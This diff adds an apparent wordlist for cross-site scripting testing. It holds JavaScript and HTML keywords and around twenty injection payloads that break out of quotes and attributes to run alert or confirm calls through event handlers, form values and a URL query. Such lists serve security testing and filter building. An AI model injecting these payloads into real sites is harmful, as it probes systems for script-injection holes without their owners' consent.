@@ -1,0 +1,34 @@
+alert
+prompt
+confirm
+svg
+prompt(1)
+confirm(1)
+alert(1)
+onerror
+onload
+javascript
+window.location
+window
+<img
+<iframe
+<snoopy
+<a
+<svg
+<details
+);alert(1);
+'-confirm(1)-' 
+'-confirm`1`-'
+');confirm(1);
+');confirm(1);
+'-confirm(1)-'
+value="" onmouseover="alert('XSS')">
+value=#000000r93kponfocus=alert(1)autofocus=r93kp
+color-input=%23000000 onmouseover=alert(1)  
+?q=<body style=overflow:auto;height:1000px onscroll=alert(1337) id=x>#x 
+onmouseover=confirm(1) 
+num=' onerror=alert(1) alt='
+"" onmouseover=alert(1) ">
+ "onload="javascript:alert(1)
+ " onload="alert(1)
+ "onmouseover="confirm(1)//
